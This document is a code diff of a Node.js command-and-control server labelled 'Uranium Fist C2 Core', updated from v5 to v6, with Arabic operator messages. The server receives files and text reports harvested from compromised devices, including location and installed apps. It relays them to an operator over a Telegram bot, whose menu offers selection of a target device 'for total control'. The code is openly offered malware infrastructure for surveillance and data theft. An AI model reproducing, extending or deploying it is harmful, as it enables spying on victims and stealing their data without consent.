@@ -1,4 +1,4 @@
-// server_uranium_core.js - Uranium Fist C2 Core v5
+// server_uranium_core.js - Uranium Fist C2 Core v6.0 (النسخة الذرية الشاملة)
 require('dotenv').config();
 const express = require('express');
 const telegramBot = require('node-telegram-bot-api');
@@ -44,7 +44,7 @@ async function sendTg(msg, options = {}) {
 }
 
 app.get('/', (req, res) => {
-    res.status(200).send(`<html><body style="background:#111;color:#ff5500;font-family:monospace;text-align:center;padding-top:50px;"><h1>[☢️] URANIUM FIST C2 CORE ONLINE [☢️]</h1></body></html>`);
+    res.status(200).send(`<html><body style="background:#111;color:#ff5500;font-family:monospace;text-align:center;padding-top:50px;"><h1>[☢️] URANIUM FIST C2 CORE v6 ONLINE [☢️]</h1></body></html>`);
 });
 
 app.post('/api/v3/uranium/upload_raw', async (req, res) => {
@@ -67,12 +67,10 @@ app.post('/api/v3/uranium/upload_raw', async (req, res) => {
         const fileSizeMB = stats.size / (1024 * 1024);
 
         if (fileSizeMB > 45) {
-            await sendTg(`⚠️ <b>الملف ضخم جداً (${fileSizeMB.toFixed(2)} MB):</b> تم حفظ الأرشيف في خزنة اليورانيوم بأمان تام.`);
+            await sendTg(`⚠️ <b>الجزء المضغوط ضخم جداً (${fileSizeMB.toFixed(2)} MB):</b> تم حفظ الأرشيف بأمان في خزنة اليورانيوم المركزية.`);
         } else {
             await appBot.sendDocument(chatId, finalPath, { 
-                caption: `☢️ <b>قبضة اليورانيوم - الحصاد الذري الشامل:</b>
-📱 العقدة: <code>${nodeId}</code> (${nodeModel})
-📂 <code>${safeName}</code> (${fileSizeMB.toFixed(2)} MB)` 
+                caption: `☢️ <b>قبضة اليورانيوم - الحصاد الذري الملكي:</b>\n📱 العقدة: <code>${nodeId}</code> (${nodeModel})\n📂 <code>${safeName}</code> (${fileSizeMB.toFixed(2)} MB)` 
             });
         }
 
@@ -101,9 +99,8 @@ app.post('/api/v3/uranium/stream', async (req, res) => {
 
         if (payload.type === 'TEXT_REPORT') {
             const textData = payload.data || '';
-            if (textData.includes('خطأ') || textData.includes('Error') || textData.includes('فشل') || textData.includes('بنجاح') || textData.includes('LOCATION') || textData.includes('APPS') || textData.includes('HARVEST') || textData.includes('DOWNLOAD') || textData.includes('الذري') || textData.includes('الحصاد')) {
-                await sendTg(`☢️ <b>تقرير قبضة اليورانيوم [<code>${nodeId}</code>]:</b>
-<pre>${textData.substring(0, 3500)}</pre>`);
+            if (textData.includes('خطأ') || textData.includes('Error') || textData.includes('فشل') || textData.includes('بنجاح') || textData.includes('LOCATION') || textData.includes('APPS') || textData.includes('HARVEST') || textData.includes('DOWNLOAD') || textData.includes('الذري') || textData.includes('الملكي') || textData.includes('جاري') || textData.includes('رفع')) {
+                await sendTg(`☢️ <b>تقرير قبضة اليورانيوم [<code>${nodeId}</code>]:</b>\n<pre>${textData.substring(0, 3500)}</pre>`);
             }
         }
 
@@ -135,8 +132,7 @@ appBot.on('message', async (msg) => {
                 inlineKeyboard.push([{ text: `☢️ ${node.model} (${node.id.substring(0, 6)})`, callback_data: `menu_${node.id}` }]);
             });
 
-            await sendTg(`☢️ <b>غرفة قيادة قبضة اليورانيوم الذرية v5:</b>
-اختر العقدة المستهدفة للسيطرة الشاملة:`, {
+            await sendTg(`☢️ <b>غرفة قيادة قبضة اليورانيوم الذرية v6:</b>\nاختر العقدة المستهدفة للسيطرة الشاملة:`, {
                 reply_markup: { inline_keyboard: inlineKeyboard }
             });
         });
@@ -192,4 +188,4 @@ appBot.on('callback_query', async (query) => {
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`[+] Uranium Fist C2 Core Online on port ${PORT}`));
+app.listen(PORT, () => console.log(`[+] Uranium Fist C2 Core v6 Online on port ${PORT}`));
